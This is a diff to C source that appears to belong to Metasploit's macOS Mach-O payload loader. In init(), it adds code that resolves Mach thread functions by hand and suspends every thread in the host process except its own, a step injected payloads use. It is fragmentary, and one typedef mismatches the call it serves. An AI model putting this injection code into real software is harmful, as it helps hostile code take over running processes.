@@ -4,6 +4,7 @@
 #include <mach-o/loader.h>
 #include <mach-o/nlist.h>
 #include <mach-o/dyld.h>
+#include <mach/mach.h>
 
 #include <dlfcn.h>
 #include <asl.h>
@@ -133,7 +134,31 @@ void init()
   asl_log_func(0, 0, ASL_LEVEL_ERR, "hello from metasploit!\n");
   asl_log_func(0, 0, ASL_LEVEL_ERR, "hello from metasploit!\n");
   asl_log_func(0, 0, ASL_LEVEL_ERR, "hello from metasploit!\n");
-  asl_log_func(0, 0, ASL_LEVEL_ERR, "hello from metasploit!\n");
+
+  typedef mach_port_t (*mach_task_self_ptr)();
+  typedef thread_port_t (*mach_thread_self_ptr)();
+  typedef kern_return_t (*thread_suspend_ptr)(thread_act_t target_thread);
+  typedef kern_return_t (*task_threads_ptr)(task_t task, thread_act_array_t thread_list, mach_msg_type_number_t* thread_count);
+
+  void* libIOKit = dlopen_func("/System/Library/Frameworks/IOKit.framework/Versions/A/IOKit", RTLD_NOW);
+  mach_task_self_ptr mach_task_self_func = dlsym_func(libIOKit, "mach_task_self");
+  mach_thread_self_ptr mach_thread_self_func = dlsym_func(libIOKit, "mach_thread_self");
+  thread_suspend_ptr thread_suspend_func = dlsym_func(libsystem, "thread_suspend");
+  task_threads_ptr task_threads_func = dlsym_func(libsystem, "task_threads");
+
+  mach_msg_type_number_t thread_count;
+  thread_act_array_t thread_list;
+  thread_act_t current_thread = mach_thread_self_func();
+  kern_return_t result = task_threads_func(mach_task_self_func(), &thread_list, &thread_count);
+  thread_act_t other_thread;
+  if (!result && thread_count) {
+    for (unsigned int i = 0; i < thread_count; ++i) {
+      other_thread = thread_list[i];
+      if (other_thread != current_thread) {
+        thread_suspend_func(other_thread);
+      }
+    }
+  }
 }
 
 uint32_t syscall_write(uint32_t fd, const char* buf, uint32_t size)
